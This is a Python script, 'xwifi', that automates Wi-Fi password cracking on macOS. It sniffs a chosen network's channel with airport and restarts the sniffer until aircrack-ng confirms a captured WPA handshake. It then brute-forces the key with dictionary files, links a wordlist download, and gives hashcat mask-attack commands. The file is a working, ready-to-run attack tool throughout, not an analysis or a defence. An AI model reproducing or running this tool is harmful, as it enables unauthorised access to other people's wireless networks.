#############################################################
###  _____           _  ___  _ _   
### |___ /_  ___ __ / |/ _ \(_) |_ 
###   |_ \ \/ / '_ \| | | | | | __|
###  ___) >  <| |_) | | |_| | | |_ 
### |____/_/\_\ .__/|_|\___/|_|\__|
###           |_|                  
###                                                          
### name: xwifi
### function: auto crack wifi in macOS
### date: 2017-06-07
### author: quanyechavshuo
### blog: http://3xp10it.cc
#############################################################

# 目前只适用于macOS
# test on:macOS sierra 10.12.5

import time
import os
os.system("pip3 install exp10it -U --no-cache")
from exp10it import figlet2file
figlet2file("xwifi", 0, True)
time.sleep(1)
from exp10it import get_string_from_command
from exp10it import get_all_file_name
from multiprocessing import Process
import re
import time
os.system("echo testfor_handshake > /tmp/forhandshakedict.txt")
a = get_string_from_command("ack")
if re.search(r"not found", a, re.I):
    input("Please install ack first,eg.brew install ack,after you finished it,press anykey to continue.")

a = get_string_from_command("airport")
if re.search(r"not found", a, re.I):
    a = get_string_from_command('''find /System/Library -name "airport" | ack "^/.*/airport$"''')
    os.system("ln -s %s /usr/local/bin/airport" % a)
    #print("add your airport to path,then run me again.")
a = get_string_from_command("aircrack-ng")
if re.search(r"not found", a, re.I):
    input("Please install aircrack-ng first,eg.brew install aircrack-ng,after you finished it,press anykey to continue.")
os.system("airport -s | tee /tmp/macOSwifi")
bssid = input("please input your target bssid you want to crack:>")
with open("/tmp/macOSwifi", 'r+') as f:
    content = f.read()
os.system("rm /tmp/macOSwifi")
match = re.search(r"%s\s+\S+\s+(\d+)" % bssid, content)
if not match:
    print("Sorry,I can not find you channel,modify your code")
else:
    channel = match.group(1)
    print("Your bssid's channel is %s,I will sniff on this channel,\nwhen you run me next time,you can try to crack other bssid with the same channel directly if you want." % channel)
    interface = input("Please input your network interface,if you don't know,press enter to continue:>")

    def worker1():
        # sniff握手包
        # 下面的命令应该都是在/tmp/下生成.cap文件
        os.system('airport %s sniff %s' % (interface, channel))

    def worker2():
        # 这里进行cap包是否得到handshake的检测
        # 这里用aircrack-ng来测试是否已经得到handshake握手包
        while 1:
            # 每60s检测一次
            time.sleep(60)
            os.system("aircrack-ng -w /tmp/forhandshakedict.txt -b %s /tmp/*.cap | tee /tmp/xwifiresult.txt" % bssid)
            with open("/tmp/xwifiresult.txt", "r+") as f:
                content = f.read()
            if re.search(r"(no data)|(No valid)", content, re.I) or content == "":
                print("I am sniffing a handshake but no one logins the wifi,so you have to wait,keep me running...")

                sniffPID = get_string_from_command(
                    "ps -a | ack '\d+(?=\s+\S+\s+\d+:\d+\.\d+\sairport.*sniff)' -o")
                os.system("kill %s" % sniffPID)
                os.system("rm /tmp/*.cap")
                p1 = Process(target=worker1, args=())
                p1.start()
                # 下面这里不能join，如果join了就会一直无法运行到下面的continue了
                # p1.join()

                continue
            else:
                break
        os.system("rm /tmp/forhandshakedict.txt")
        sniffPID = get_string_from_command("ps -a | ack '\d+(?=\s+\S+\s+\d+:\d+\.\d+\sairport.*sniff)' -o")
        os.system("kill %s" % sniffPID)

    p1 = Process(target=worker1, args=())
    p2 = Process(target=worker2, args=())
    p1.start()
    p2.start()
    p1.join()
    p2.join()
    print("Congratulations! Got handshake!")
    choose = input(
        "I will crack the handshake now,there are 2 ways to go:\n1.use aircrack-ng\n2.use hashcat\nyour choose:>")
    if choose == '1':
        while 1:
            dictPath = input("Please input your dict path,I support folder or a dict file,if your input is a directory,I will use all files in the directory as dict one by one,if you don't have any dict,you can download it from http://dx.mqego.com/soft1/wpa2pojiezidian.rar and input the path in your pc\nyour path:>")
            if os.path.exists(dictPath) is False:
                print("file or path not exist")
                continue
            else:
                break
        if os.path.isfile(dictPath) is True:
            # 单个字典文件
            os.system("aircrack-ng -w %s -b %s /tmp/*.cap | tee /tmp/xwifiresult.txt" % (dictPath, bssid))
        else:
            # 文件夹字典
            allDictList = get_all_file_name(
                dictPath, ["txt", "dic", "lst", "dict", "TXT", "DIC", "LST", "DICT"])
            for each in allDictList:
                eachAbsDictPath = dictPath + "/" + each
                os.system("aircrack-ng -w '%s' -b %s /tmp/*.cap | tee /tmp/xwifiresult.txt" %
                          (eachAbsDictPath, bssid))
    if choose == "2":
        print("you can crack it in below steps:\n将cap文件转成hashcat支持的格式再用hashcat破解:\na.将https://github.com/hashcat/hashcat-utils/releases里面的cap2hccapx.bin放到kali64(vm)下运行得到hccapx文件\nb.然后再运行:b.hashcat -a 3 -m 2500 output.hccapx ?d?d?d?d?d?d?d?d")
